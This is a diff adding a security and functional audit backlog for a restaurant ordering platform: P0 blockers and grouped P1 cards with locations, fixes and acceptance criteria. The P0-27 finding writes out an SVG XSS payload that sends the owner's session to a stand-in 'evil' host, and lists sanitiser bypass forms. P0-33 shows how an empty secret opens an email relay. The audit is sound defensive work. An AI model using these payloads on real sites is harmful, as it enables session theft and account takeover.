+writes the cookie plus localStorage and reloads. On reload nothing consumes it:
+- `loadAllStaticStrings` / `getStaticStrings` (`apps/reference/lib/i18n/index.ts:31,68`)
+  are imported by **no component**
+- `setOverrides` and `setStaticStrings` (`packages/restaurant/src/stores/language.ts:117-118`)
+  have **zero call sites**; `initialize` has one,
+  `apps/themes/components/admin/AdminLanguageSwitcher.tsx:51`, itself never mounted
+- so `locale` stays at its literal `'fr'` (`:113`) and `isReady` at `false` (`:116`),
+  which also makes `components/storefront/LanguageSwitcher.tsx:24` return `null` forever
+- manual UI overrides are read only by the admin editor
+- product names have no translated field (see P0-23)
+
+**Fix.** Mount an initialiser in the storefront shell calling `initialize()` +
+`setOverrides(getUIOverrides)` + `setStaticStrings(await loadAllStaticStrings(codes))`,
+and expose a `t()` accessor — override → static JSON → default locale → key — actually
+used by the components.
+
+**Done when.** Switching language changes the menu and button text.
+
+---
+
+## P0-25 · The public blog is hard-coded demo content
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #112
+
+**Problem.** The owner publishes three articles, opens their site, and finds six of
+somebody else's — Unsplash photos, future dates ("12 Mars 2026"). All twelve card
+links 404. Everything the Auto Blog generates lands in the same void.
+
+**Where.** `apps/reference/app/(storefront)/blog/_components/BlogContent.tsx:18-90` —
+a hard-coded `BLOG_POSTS` array. No storefront file calls
+`api.blog.listPublishedArticles` (verified: every `api.blog` hit is under
+`components/admin/blog/`). There is no `app/(storefront)/blog/[slug]/page.tsx` in
+either app, while the cards link to `/blog/${post.slug}` (`:134`, `:197`).
+The same three fake posts are duplicated in `menu/page.tsx:427-445` and
+`_components/HomepageContent.tsx:56-60`.
+
+**Fix.** Replace `BLOG_POSTS` with
+`useQuery(api.blog.listPublishedArticles, { storeId })` and add
+`app/(storefront)/blog/[slug]/page.tsx` backed by `getArticleBySlug`, with
+`generateMetadata` and sanitisation at render.
+
+**Done when.** An article published in the admin appears on `/blog` and its own page
+returns 200.
+
+---
+
+## P0-26 · The Auto Blog has no scheduler
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #112
+
+**Problem.** A €19–99/month subscription. The owner sets "weekly, Tuesday, 09:00,
+auto-publish", saves — and no article is ever generated. Only the manual
+"Generate with AI" button works.
+
+**Where.** `packages/convex-schema/src/tables/autoBlog.ts:63-118` stores `isEnabled`,
+`frequency`, `preferredWeekdays`, `preferredMonthDays`, `preferredHour`, `timezone`,
+`approvalMode`; `blogAutoQueue` even has an index documented "Cron: find pending jobs
+due for execution". Yet `grep cronJobs` across `apps/*/convex` and
+`packages/convex-functions` returns **zero results**, and `blogAutoQueue` has no reader
+or writer outside the schema.
+`approvalMode: "auto_publish"` is validated against the plan
+(`blogAutoGuards.ts:331`) and then read by nothing: `saveGeneratedArticleCore` →
+`createArticleCore` always saves `status: "draft"` (`blog.ts:395`).
+`tasks/auto-blog-spec.md:157-183` specifies two crons — neither exists.
+
+**Fix.** Ship the two crons from spec §4.2 (`planAutoBlogJobs` hourly,
+`executeAutoBlogQueue` every 5–15 min) and honour `approvalMode` in the generation
+path. Otherwise remove the scheduling fields and the auto-publish option from the UI
+and reposition the offer as manual on-demand generation — product decision, see LAUNCH-04.
+
+**Done when.** A weekly configuration produces an article with no human action.
+
+---
+
+## P0-27 · Any customer account can store an XSS payload on the site's own origin
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #97
+
+**Problem.** Full admin takeover of a restaurant by any self-registered storefront customer.
+
+Scenario: the customer signs up, uploads an SVG containing
+`<script>fetch('/api/auth/get-session').then(r=>r.text()).then(t=>fetch('https://evil/?d='+t))</script>`,
+then sends the returned URL to the owner through the contact form. Opening it runs
+script in the same origin as `/dashboard`, so the fetches carry the owner's session.
+
+**Where.** `apps/reference/app/api/upload/route.ts:46` — the only gate is
+`isAuthenticated()`, i.e. any Better Auth session, i.e. any storefront customer; the
+`CUSTOMER` role has no `content:write` (`packages/core/src/auth/rbac.ts:246-251`).
+`folder` is caller-supplied and `cms` is in `VALID_FOLDERS` (`:13`); `image/svg+xml` is
+allowed for `cms`, `products`, `branding` and `stores`
+(`packages/core/src/aws/types.ts:54,61,68-79`); `contentType` comes from the multipart
+part header, so it is attacker-controlled; the object is written with
+`ContentType: contentType` (`:115`) and the route returns
+`/api/files/cms/<uuid>.svg` (`:121`) — **the application's own origin**.
+`apps/reference/app/api/files/[...key]/route.ts:53` echoes `response.ContentType`
+verbatim, with no auth and no CSP anywhere in the repo.
+
+The Convex twin was already hardened with a role check
+(`apps/reference/convex/storageUpload.ts:81-83`, comment: *"'Logged in' included every
+customer account, so the check is by role"*) — the Next.js route was left behind.
+
+The SVG sanitiser is bypassable anyway
+(`packages/cms/src/sanitize/svgSanitizer.ts:31,34`): `EVENT_HANDLER_PATTERN` requires
+whitespace before the handler, so `<svg/onload="…">` survives; and
+`JAVASCRIPT_URI_PATTERN` sees neither `&#106;avascript:` nor
+`<set attributeName="href" to="javascript:…">`. Both payloads were executed against
+`sanitizeSvg` and came back unchanged.
+
+**Fix.**
+1. Replace `isAuthenticated()` with a `content:write` check.
+2. Drop `image/svg+xml` from the allowed types, or route it through **DOMPurify in SVG
+   mode** (not the current regex).
+3. On `/api/files`, force `Content-Disposition: attachment` and an allowlisted
+   `Content-Type` for anything that is not an image or video.
+4. Add a CSP — there is none today.
+
+**Done when.** A `CUSTOMER` account gets 403 from `/api/upload`, and a booby-trapped
+SVG uploaded by an authorised account is served inert.
+
+---
+
+## P0-28 · `/contact` white-screens on every visit
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #96
+
+**Problem.** The page is linked from the header on **every** storefront page. It throws
+as soon as the query resolves, and there is no error boundary in the repo, so the
+visitor gets Next's default error screen.
+
+**Where.** `apps/reference/app/(storefront)/contact/_components/ContactContent.tsx:261`
+```tsx
+{store?.address ?? "123 Rue de la Gastronomie"}
+```
+`address` is a **required** `v.object({street, city, postalCode, country, latitude?, longitude?})`
+(`packages/convex-schema/src/tables/stores.ts:13`). React throws
+"Objects are not valid as a React child". Identical file in `apps/themes`.
+
+Both neighbours are wrong too: `:263` reads `store?.city` and `:278`
+`store?.openingHours`, neither of which exists on the document (they are `address.city`
+and `hours`) — so both silently fall back to invented placeholders.
+
+**Fix.** Compose the address from its fields, derive the hours rows from `store.hours`
+(`{day:number, open, close, isClosed}`), and add `app/(storefront)/error.tsx` **and**
+`app/(admin)/error.tsx` in both apps.
+
+**Done when.** `/contact` shows the real address and hours, and an e2e covers the page.
+
+---
+
+## P0-29 · The cart conflates option variants of the same dish
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #111
+
+**Problem.** The customer orders one pizza with extra cheese and one plain. They tap
+"+" on the second: **both** go to 2, and the total silently doubles before checkout.
+Clicking the bin on either removes both lines.
+
+**Where.** `packages/restaurant/src/stores/cart.ts:79-96` — `removeItem(productId)`
+filters and `updateQuantity(productId, quantity)` maps on `item.productId` alone, while
+`addItem` (`:59`) uses `isSameItem` (product **+ options**, `services/cart.ts:86-103`)
+and deliberately keeps separate lines. All eight call sites pass only the product id:
+`app/(storefront)/cart/page.tsx:234,301,315,339` and
+`components/storefront/cart-sheet.tsx:238,305,319,343` — whose React `key`
+(`cart-sheet.tsx:179`) already includes the options.
+
+Proven by test: `p1 + cheese` ×1 and `p1 + olives` ×1 then `updateQuantity('p1', 2)`
+yields quantities `[2,2]` and `getItemCount() === 4`; `removeItem('p1')` empties the cart.
+
+**Fix.** Assign a stable `lineId` in `addItem` (hash of `productId` + sorted option ids)
+and key `removeItem` / `updateQuantity` on it. Update all eight call sites.
+
+**Done when.** A regression test covers two variants of one product, plus an e2e
+"add two configurations of a dish, open the cart at 375px".
+
+---
+
+## P0-30 · `apps/site` — customer billing data is publicly readable
+**List:** P0 blockers · **Priority:** urgent · **Parent:** —
+
+**Problem.** Anyone can read a customer's billing history from their email address,
+**including the Stripe PDF links**, and the full commercial record from an `orderId`.
+
+**Where.** Three public `query` functions with no checks, on a deployment whose URL
+ships in the browser bundle (`NEXT_PUBLIC_CONVEX_URL`):
+- `apps/site/convex/invoices.ts:86-96` — `getByEmail` takes an arbitrary email and
+  returns up to 50 invoices including `invoicePdfUrl` and `hostedInvoiceUrl`
+- `apps/site/convex/subscriptions.ts:89-99` — plan, status, Stripe ids
+- `apps/site/convex/orders.ts:97-102` — `ctx.db.get(orderId)`, i.e. the whole document:
+  email, first/last name, phone, restaurant name, city, **SIRET**, `amountCents`,
+  `stripeSessionId`
+
+Six lines below `orders.get`, the comment on `getCheckoutAccess` (`:104-112`) states
+exactly the rule these break: *"Anything more (email, phone, SIRET, amount) would be
+readable by anyone holding or guessing an id."*
+
+**None of the three has a caller** in `app/`, `components/` or `lib/`.
+
+**Fix.** Convert to `internalQuery`, or delete them. If a client area needs them later,
+derive the email from the authenticated session — never from an argument.
+
+**Done when.** `grep -n "^export const getByEmail = query"` returns nothing in
+`apps/site/convex`.
+
+---
+
+## P0-31 · `apps/site` — with no Stripe key, everything is sold for free
+**List:** P0 blockers · **Priority:** urgent · **Parent:** —
+
+**Problem.** A key forgotten, cleared during the test→live swap, or mistyped on the
+production deployment, and **every visitor who submits the form gets a `paid` order**:
+founder seats are consumed (`countFoundersSold`, `orders.ts:145-166`), confirmation
+emails go out, the ops console reports revenue — with no money taken. Nothing in the UI
+distinguishes it: `getCheckoutAccess` only asks `status === "paid"`.
+
+**Where.** `apps/site/convex/stripe.ts:86-90`
+```ts
+function getStripe(): Stripe | null {
+  const key = process.env.STRIPE_SECRET_KEY
+  if (!key) return null
+  return new Stripe(key)
+}
+```
+then `:235-276`
+```ts
+if (!stripe) {
+  console.log(`[TEST MODE] Order ${orderId} created … — skipping Stripe`)
+  await ctx.runMutation(internal.orders.updateStatus, {
+    orderId, status: "paid", paymentMethod: "card",
+  })
+}
+```
+No environment guard. Same shape in `stripeConnect.ts:34-44`, which fabricates an
+`acct_test_…` and sets `stripeConnectStatus: "active"`.
+
+**Fix.** Gate the branch on an explicit `BEYOURS_TEST_CHECKOUT === "true"`, and throw a
+loud error when `STRIPE_SECRET_KEY` is absent without it. Same in `stripeConnect.ts`.
+
+**Done when.** Removing `STRIPE_SECRET_KEY` from a deployment makes checkout fail
+instead of succeeding for free.
+
+---
+
+## P0-32 · The environment fail-fast validates nothing a client must configure
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #102
+
+**Problem.** The site boots printing "All environment variables validated successfully",
+then fails at the client one feature at a time: Stripe not configured, encryption key
+missing, S3 bucket missing, password reset silently doing nothing. Every failure lands
+on the restaurant owner instead of on deploy.
+
+**Where.** `packages/core/src/env/schemas.ts:41-96` — all **28** `siteEnvSchema` fields
+are `opt()`. Only `AWS_REGION`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and
+`OPENAI_API_KEY` are required. Worse, `opt()` (`:4-5`) maps `''` → `undefined`, and
+every `.env.example` ships these keys empty — so copying the template and filling
+nothing still validates.
+
+Variables read at runtime and **absent from the schema** (sample):
+| Variable | Read at | Consequence when unset |
+|---|---|---|
+| `AWS_S3_PUBLIC_BASE_URL` | `imageToProduct.ts:52` +15 | **Every** image 403s on a private bucket |
+| `ADMIN_BOOTSTRAP_TOKEN` | `userProfiles.ts:120` | No first admin can be appointed |
+| `NEXT_PUBLIC_SITE_URL` | `lib/seo.ts:40`, `sitemap.ts:17` | Site indexed under the wrong domain |
+| `BID_APP_URL` | `gameEmail.ts:117`, `bidSubscription.ts:39` | Dead links in customer email |
+| `UNSPLASH_ACCESS_KEY` | `unsplashSearch.ts:38` | CMS image search returns nothing |
+| `AUTH_ALLOW_UNVERIFIED_EMAIL` | `auth.ts:30` | Undiscoverable by the operator |
+
+`EMAIL_API_SECRET`, `CONVEX_URL` and `AUTH_SECRET` are documented and **never read**;
+`UBER_DIRECT_WEBHOOK_SECRET` is declared and read by nobody.
+`apps/site` has **no `instrumentation.ts`**: zero validation on beyours.fr.
+
+**Fix.** Split into `siteEnvRequiredSchema` (`NEXT_PUBLIC_CONVEX_URL`,
+`CONVEX_SITE_URL`, `SITE_URL`, `BETTER_AUTH_SECRET` min 32, `ENCRYPTION_KEY`,
+`AWS_S3_BUCKET_NAME`, `AWS_S3_PUBLIC_BASE_URL`, `AWS_SES_FROM_EMAIL`) plus a
+feature-gated optional tier; make `opt()` reject `''` on required fields; declare the
+missing variables; add `instrumentation.ts` to `apps/site`.
+
+**Done when.** An unconfigured clone refuses to boot, naming exactly what is missing.
+
+---
+
+## P0-33 · An empty `BETTER_AUTH_SECRET` opens an email relay
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #102
+
+**Problem.** Anyone can POST to `/api/email/send` with any recipient, subject, body and
+`resetLink` — from the restaurant's SES-verified domain. Phishing under the client's brand.
+
+**Where.** `packages/core/src/aws/ses/route-handler.ts:80-88`
+```ts
+const tokenBuf = Buffer.from(token)
+const secretBuf = Buffer.from(config.secret)
+if (tokenBuf.byteLength !== secretBuf.byteLength || !timingSafeEqual(tokenBuf, secretBuf)) {
+  return Response.json({ error: 'Unauthorized' }, { status: 401 })
+}
+```
+**Verified by execution:** with `secret = ""` and an empty token, the lengths are
+`0 === 0` and `timingSafeEqual(<empty>, <empty>)` returns `true` → **accepted**.
+`apps/reference/app/api/email/send/route.ts:4` passes
+`process.env.BETTER_AUTH_SECRET!`, `BETTER_AUTH_SECRET=` ships empty in the
+`.env.example` files, and `opt()` accepts the empty string.
+(With the variable genuinely unset, `Buffer.from(undefined)` throws inside the `try`
+→ 500, so that case fails closed. Only the empty-string case is exploitable.)
+`resetLink` is validated only by `z.string().url()` (`:21`), with no domain check.
+
+**Fix.** Reject any secret shorter than 32 bytes at handler construction; use a
+dedicated `EMAIL_API_SECRET` (already documented, never read); validate `resetLink`'s
+origin against `SITE_URL`.
+
+**Done when.** An empty secret fails startup, and an empty bearer token gets 401.
+
+---
+
+## P0-34 · Two contradictory S3 bucket policies in the same product
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #97
+
+**Problem.** Whichever policy the operator picks, half the product breaks. Private
+bucket → every CMS, blog and product image 403s with no error anywhere. Public bucket →
+every uploaded file is world-readable by URL with no auth.
+
+**Where.** Two opposite assumptions, each commented:
+- `apps/reference/convex/storageUpload.ts:119-121` builds
+  `https://<bucket>.s3.<region>.amazonaws.com/<key>` — *"Public URL (bucket policy
+  allows public reads)"*
+- `apps/reference/app/api/upload/route.ts:120-121` returns `/api/files/<key>` —
+  *"Return a proxy URL since the S3 bucket is not publicly accessible"*
+
+Sixteen Convex files build the direct form (`cmsMediaConfirmUpload`, `cmsMediaProcess`,
+`cmsSvgUpload`, `cmsSeed`, `blogAutoGenerate`, `blogImageGenerate`, `imageToProduct`,
+`storageUpload` × 2 apps), and `next.config.ts:36-39` allowlists
+`**.s3.eu-west-3.amazonaws.com` in `images.remotePatterns`.
+
+Already tracked as **S3-11** in `tasks/sprint-durcissement-reference.md`, not started.
+
+**Fix.** Pick one (product decision — see LAUNCH-05). Recommended: private bucket,
+delete `buildPublicUrl` from all 16 files, route everything through `/api/files` once it
+is authenticated (P0-27), drop the S3 host from `remotePatterns`, and make
+`AWS_S3_PUBLIC_BASE_URL` required if going the CloudFront route instead.
+
+**Done when.** A CMS-uploaded image renders on the storefront of a fresh deployment, and
+an unreferenced object is not anonymously readable.
+
+---
+
+## P0-35 · Gamification is absent from the product being sold
+**List:** P0 blockers · **Priority:** urgent · **Parent:** #107
+
+**Problem.** `apps/themes` is the template cloned for every paying client. There it
+shows **five "Coming soon" menu entries** and a placeholder player page. The owner sees
+Games & Prizes, QR Codes, Actions, Winners and Settings in the sidebar — all dead. And
+the backend is complete: `apps/themes/convex/gameEmail.ts:119` emails the winner a
+`/game/prize/{code}` link that **404s**.
+
+**Where.**
+| Element | `apps/reference` | `apps/themes` |
+|---|---|---|
+| `dashboard/games/{catalog,qr-codes,actions,winners,settings}` | real pages | `<ComingSoon/>` |
+| `app/game/[qrCodeId]/_components/GameContent.tsx` | 424 lines | **28-line placeholder** |
+| `_components/` (wheel, scratch, cooldown, ticket…) | 11 components | **0** |
+| `lib/game/` (wheel, fingerprint, confetti, haptics, sounds) | 8 files | **absent** |
+| `app/game/prize/[code]` | present | **absent** |
+
+The string shown to the end customer is literally
+`"Gamification flow will be implemented here."`
+(`apps/themes/app/game/[qrCodeId]/_components/GameContent.tsx:23`).
+
+**Root cause.** The game components were written inside the test-bench app rather than
+a package: `grep -l "wheel\|scratch" packages/ui/src packages/restaurant/src` returns
+nothing. The template could never inherit them.
+
+**Fix, in two steps.**
+1. *Immediate, one line per file.* Replace the five `ComingSoon` pages with the already
+   exported imports: `GameCatalogPage`, `GameQrCodesPage`, `GameActionsPage`,
+   `GameWinnersPage` (`packages/admin/src/index.ts:75-79`).
+2. *Structural.* Lift `apps/reference/lib/game/` and the 11 components into a package
+   (`packages/ui`, or a new `packages/game`), then render them from both apps. Copy
+   `app/game/prize/[code]/` into `apps/themes` and add `qrcode` + `@types/qrcode` to its
+   `package.json`.
+3. Delete `apps/themes/components/admin/games/GamesContent.tsx` (604 lines, no importer).
+
+**Done when.** The scan → actions → play → win → ticket → staff validation flow passes
+end to end **in `apps/themes`**.
+
+---
+---
+
+# `TECH` — 12 grouped P1 cards
+
+Each card groups the P1 findings of one domain. The whole card is the issue body;
+every bullet becomes a checklist item in ClickUp.
+
+---
+
+## TECH-01 · Promotions and discounts — four sold features, none applied
+**Priority:** high · **Parent:** #108
+
+- [ ] **Product/category scope ignored.** `promotionDiscount.ts:170-187` computes
+  `Math.round(subtotal × rate / 100)` over the **whole** basket. `promotion.scope`,
+  `targetProductIds` and `targetCategoryIds` are collected
+  (`promotion-form.tsx:250-269`), stored (`tables/promotions.ts:46-47`) and read by no
+  pricing code. "−20% on pizzas" over 1 pizza (€12) + 8 drinks (€24) discounts €7.20
+  instead of €2.40.
+  → pass the verified line items into `resolvePromotionDiscount` and compute over the
+  eligible subset only.
+- [ ] **Happy hour never enforced.** `promotion.scheduling.{activeDays,activeTimeFrom,activeTimeTo}`
+  (`tables/promotions.ts:57-59`) is rendered in the promotions table
+  (`promotions-page.tsx:133-138`) and read by nothing. A "Mon–Fri 17:00–19:00" discount
+  applies on Sunday at 21:00.
+  → add an `activeSchedule` check with a `not_scheduled` rejection reason, in
+  `globalSettings.timezone`.
+- [ ] **Automatic promotions are dead.** `promotions.listActiveAuto`
+  (`promotions.ts:80-91`) is publicly exported and has **zero callers**.
+  `orders.create` only ever reads `args.promotionId`.
+  → either apply them server-side, or remove the "automatic offer" trigger from the form.
+- [ ] **`free_delivery`: the screen says €26.90, the card is charged €22.00.**
+  `checkout/page.tsx:144-147` hard-codes `discountAmount = 0`; the server sets
+  `discount = deliveryFee` (`promotionDiscount.ts:200-206`).
+  → mirror the discount client-side, or return it from a server query.
+- [ ] **Fixed discount larger than the basket displays an amount never granted.**
+  Client: uncapped `discountValue` (`checkout/page.tsx:142-143`); server: clamped to
+  `subtotal + tax + delivery` (`promotionDiscount.ts:222`). −€50 shown on a €22 order.
+- [ ] **The discount line is missing from both order views.**
+  `order/[orderId]/page.tsx:231-250` and `order-detail-page.tsx:393-410` never render
+  `order.discountAmount`: the receipt does not add up.
+
+---
+
+## TECH-02 · Orders — lifecycle, idempotence and cash
+**Priority:** high · **Parent:** #104
+
+- [ ] **No idempotence on order creation.** `orders.create` has no dedup key, unlike
+  `createFromWebhook` (`orders.ts:717-730`). The button re-enables in `finally`
+  (`checkout/page.tsx:475-477`) while the redirect is in flight, and the cart survives
+  a Back navigation → two orders, two tickets, two promotion-usage increments.
+  → accept a client `idempotencyKey`, index it with `storeId`, return the existing
+  order on replay.
+- [ ] **A cash order can never be marked paid.** `internalUpdatePaymentStatus`
+  (`apps/reference/convex/orders.ts:134-151`) is reachable only from the provider
+  actions. No `payments` row is ever created for cash: the "Espèces" filter
+  (`payments-page.tsx:131`) can never match, and there is nothing to reconcile or refund.
+  → a permissioned `markCashPaid` mutation writing a `provider: "cash"` payment.
+- [ ] **Cancelling an order leaves its kitchen ticket live.** `updateStatus` never
+  touches `kitchenTickets`; the sync is one-way (`kitchenTickets.ts:230-236`). The KDS
+  keeps showing it and `/track/[token]` says "In preparation" — the cancelled branch
+  (`track/[token]/page.tsx:75`) is unreachable from an order cancellation.
+- [ ] **Minimum order amount and delivery radius are never enforced.**
+  `globalSettings.minimumOrderAmount` (`globalSettings.ts:45`) and `delivery.radius`
+  (`:50`) are configurable and read by nobody. A €3.30 order passes against a €15
+  minimum; a 40 km delivery is accepted.
+- [ ] **Percentage fee mode without Uber Direct makes delivery checkout impossible.**
+  `delivery-tab.tsx:95-116` does not gate the option; `orders.create:379-383` then
+  throws "Un devis de livraison est requis", which the customer cannot satisfy.
+
+---
+
+## TECH-03 · Payments — binding, deduplication and OAuth
+**Priority:** high · **Parent:** #106
+
+- [ ] **Stripe settlement is not bound to amount or currency.**
+  `apps/reference/convex/stripe.ts:84-163` — the comment at `:83` claims
+  `assertSettlesOrder` binds session to order, currency and amount; grep finds it only
+  at `sumup.ts:167` and `paypal.ts:235`. `verifyCheckoutSession` is a public action
+  taking any `sessionId` and records `amount: rawSession.amount_total ?? order.total`
+  with no comparison. Stripe is the default provider.
+  → extend `PaymentProvider` (`paymentSettlement.ts:21`) with `"stripe"` and call
+  `assertSettlesOrder` before `:122`, and in `stripeWebhook.ts`.
+- [ ] **No event deduplication — duplicate payment rows.** The return page
+  (`stripe.ts:120-145`) and the webhook (`stripeWebhook.ts:38-67`) both do
+  read-then-write across separate invocations; `payments.internalCreate` inserts
+  unconditionally (`payments.ts:64-73`) while the `by_externalId` index exists
+  (`tables/payments.ts:73`) and is never queried. One charge, two €48 rows, each fully
+  refundable.
+  → upsert on `(orderId, externalId)` plus a processed-events table like
+  `apps/site/convex/stripeEvents.ts`.
+- [ ] **SumUp OAuth callback has no CSRF state check.** `oauthConnect.ts:161-175`
+  generates a `state` and **never persists it**; `oauthCallbackHandlers.ts:158-201`
+  never reads it. The infrastructure exists and is used correctly by Uber Eats
+  (`uberEatsOAuth.ts:65`, `uberEatsOAuthHttp.ts:31-45`). An injected authorization code
+  overwrites the `paymentConnections` row and routes card payments into a third party's
+  SumUp account.
+- [ ] **Stripe Connect is a shell.** `oauthConnect.ts:110-148` creates and stores a
+  connected account; no charge path reads it (`stripe.ts:41-43` builds the client from
+  the platform key, with no `stripeAccount`, `on_behalf_of` or `transfer_data`). The
+  owner sees "stripe connected" and the money goes elsewhere.
+- [ ] **A charge taken while the webhook is missed is lost.**
+  `stripeWebhookVerify.ts:37-50` only handles `checkout.session.completed`;
+  `payment_intent.succeeded` and `charge.refunded` are swallowed. No reconciliation job.
+- [ ] **A partially refunded payment cannot be refunded again from the UI.**
+  `payments-page.tsx:166-169` requires `status === "succeeded"` while `planRefund`
+  accepts `partially_refunded` (`refundPolicy.ts:66`).
+
+---
+
+## TECH-04 · Delivery integrations — money, statuses and volume
+**Priority:** high · **Parent:** #103
+
+- [ ] **Uber line items stored at ~2.1× their real price.** `uberEatsWebhook.ts:145`
+  (and `:374`) feeds `item.totalPrice` — already `(unitPrice + modifiers) × quantity`
+  (`mappers.ts:120`) — into the slot `orders.ts:743` treats as a unit price and `:749`
+  re-multiplies by quantity. Deliveroo passes a genuine unit price
+  (`deliverooWebhook.ts:268`), so the two platforms silently disagree.
+  → pass `item.unitPrice`, and add a test that runs mapper output through
+  `createFromWebhook` rather than testing each half in isolation.
+- [ ] **Deliveroo status vocabulary does not match the API.**
+  `deliverooWebhook.ts:136-158` — no `confirmed` case, `canceled` misspelled, four
+  values Deliveroo never sends, and a `default: return "pending"` that drags the order
+  **backwards**. A cancellation cancels nothing (`cancelledAt` never set).
+- [ ] **A `denied` status 500s the webhook into a retry loop.** `types.ts:355` maps
+  `DENIED → "denied"`, absent from the `updateFromWebhook` validator
+  (`orders.ts:787-796`); the cast at `:261` hides the mismatch. Uber retries seven times.
+- [ ] **Every delivery webhook full-scans `orders`.** `orders.ts:719` and `:810` use
+  `.filter()` with no index, while `by_external_order` exists
+  (`tables/orders.ts:129`). Past ~16,000 orders (Convex's per-transaction ceiling)
+  **order ingestion stops permanently**, with no alert.
+- [ ] **Item availability (86'ing) and store pause are not wired.**
+  `deliveroo/store-status.ts:44,77,14` and `uber-eats/client.ts:389` have no callers.
+  Menu sync filters on `isActive` only and ignores `stock`
+  (`uberEatsMenuSync.ts:211-212`). A sold-out dish keeps selling.
+  The Deliveroo path is also mis-targeted: `PUT …/v1/…/unavailabilities` against the
+  documented `PUT …/v2/…/menu/item-unavailabilities`.
+- [ ] **Menu sync fans out on every product edit, with no throttling or backoff.**
+  `products.ts:32-39` and `menus.ts:21-28` schedule `syncAllStores` on every mutation —
+  Convex does not dedupe scheduled jobs — and the sweep pushes the menu of **every**
+  store. A 50-product import queues 50 sweeps × 2 platforms; neither client has 429 backoff.
+- [ ] **Sandbox flags default to production, read in 20 files.** None has a default;
+  the templates ship `true`, which sends production credentials to the test endpoints.
+  → one `isSandbox()` in `@be-in-digital/core/env`, with the variable made required.
+- [ ] **Deliveroo failures are acknowledged as 200.**
+  `deliverooWebhookHandler.ts:65-79` answers 200 even when `processOrderWebhook` returns
+  `{success:false}`: Deliveroo never retries and the order is gone with no record.
+- [ ] **The Deliveroo e2e suite cannot sign correctly.**
+  `e2e/deliveroo/test-config.ts:64-82` signs the body alone, while the verifier requires
+  `sequenceGuid + " " + body` (`deliverooWebhookHandler.ts:104-110`).
+
+---
+
+## TECH-05 · Kitchen — stations, locks and print reliability
+**Priority:** high · **Parent:** #100
+
+- [ ] **Multi-station routing does not exist.** No production path ever sets
+  `kitchenTickets.station`; `assignStation`
+  (`packages/restaurant/src/services/kitchen.ts:48-66`) has no caller outside its own
+  test; `stationMapping` has no schema field, no UI and no persistence. The station
+  filter therefore never renders (`KitchenContent.tsx:140`).
+- [ ] **Two open tablets print every ticket twice.**
+  `KitchenPrintTrigger.tsx:34-51` — each instance takes `printQueue[0]` and only claims
+  the ticket after `onafterprint`, 1–20 s later. No lock.
+  → a `claimForPrint` mutation flipping `pending → printing` atomically.
+- [ ] **A failed print is never retried.** `kitchenTickets.ts:492-509` sets `failed`;
+  `getPrintQueue` (`:93-107`) only returns `pending`. `printAttempts` is incremented and
+  read by nobody.
+- [ ] **Blank slips can print and be recorded as successful.**
+  `KitchenPrintTrigger.tsx:110` waits 100 ms after `root.render` — React 19 commits
+  asynchronously — then prints (`:139`). `onafterprint` also fires when the user
+  **cancels** the dialog.
+  → `flushSync` or a double `requestAnimationFrame`, and gate success on something
+  stronger than `onafterprint`.
+- [ ] **The overdue alarm can never fire.** `getOverdueCount` (`:112-140`) compares
+  `estimatedReadyAt`, derived from `estimatedPrepTime` (`:365-367`) — which neither
+  `createWithTicket` nor `uberEatsWebhook` ever passes. Only the demo seed sets it.
+- [ ] **The allergen block on the ticket is only ever populated by demo data.**
+  `kitchenTickets.allergens` has exactly one writer: `seedKitchenOrders.ts:188`.
+  Products do carry `allergens`.
+- [ ] **"Manual confirmation" is a saved setting nothing reads.**
+  `store.orderConfirmation` (`tables/stores.ts:57-61`) is written by
+  `stores.ts:334-339`, offered in the UI, and read nowhere.
+- [ ] **Choosing a "cloud" printer silently disables printing.**
+  `KitchenSettingsTabContent.tsx:249-259` offers `star_cloud`/`epson_cloud`/`sunmi_cloud`
+  as selectable options; `KitchenPrintTrigger.tsx:45` returns immediately for any
+  `provider !== "browser"`. Tickets pile up as `pending` and the alarm beeps every 30 s
+  with no explanation.
+  → mark the three options `disabled`.
+- [ ] **Print configuration is unreachable from the engine.**
+  `stores.updatePrintConfig` has no caller in `packages/admin`, `apps/reference` or
+  `apps/themes`. `KitchenSettingsTabContent` exists only in `apps/themes`, imported by a
+  `SettingsContent` that nothing mounts.
+  → lift the tab into `packages/admin` as a store-detail tab.
+
+---
+
+## TECH-06 · Catalogue — cross-store scope and dead fields
+**Priority:** high · **Parent:** #105
+
+- [ ] **`updateWithPropagation` writes into stores the caller does not administer.**
+  `products.ts:690-691` — authorization covers only the store of the named product, then
+  the handler patches every linked twin with no per-store check. The mutation is public.
+  It also skips the `price < 0` guard present at `:368`.
+- [ ] **`externalProductMappings.upsert` can overwrite another store's mapping.**
+  `externalProductMappings.ts:83-99` — authorized on `args.storeId`, but the lookup is
+  `by_internal` on `(internalProductId, platform)` with no check that the product belongs
+  to that store, then `patch`. Product ids of any store are public via `api.products.list`.
+- [ ] **`duplicateCatalog` throws on any store that has categories.**
+  `products.ts:544-552` writes `image: cat.image` (the field is `imageUrl`) and omits the
+  required `createdAt`/`updatedAt`. The test `authorization.test.ts:761-773` passes only
+  because the source store has no categories.
+- [ ] **Deleting a category orphans its products.** `categories.ts:138-142` is a bare
+  `ctx.db.delete`, while `categories-page.tsx:250-251` promises "products will lose their
+  category assignment". They keep a dead `categoryId`, stay orderable under "All", and
+  render as "Inconnu" in the admin.
+- [ ] **Per-product `taxRate` is collected and never applied.** Required at creation
+  (`products.ts:239`), edited under "Taux de TVA (%)", read only by the two platform
+  mappers. See P0-03.
+- [ ] **`categoryId` is never checked against the product's store**
+  (`products.ts:230-305` and `:310-374`); same for menu sections (`menus.ts:43-113`) and
+  `orphanProducts.ts:79-91`.
+- [ ] **Products have no orderable sort.** `sortOrder` is in the form schema (`:79`) with
+  no input, and there is no reorder UI (categories have one).
+- [ ] **Clearing the VAT field makes the save fail** with a generic toast
+  (`product-form.tsx:42` yields `undefined`, the validator requires `v.number()`).
+
+---
+
+## TECH-07 · Email marketing — compliance, throughput and automations
+**Priority:** high · **Parent:** #109
+
+- [ ] **No `List-Unsubscribe` / `List-Unsubscribe-Post` headers.**
+  `emailCampaignActions.ts:136-160` sets only three `X-` headers. Gmail and Yahoo have
+  required one-click unsubscribe for bulk senders since February 2024; without it, bulk
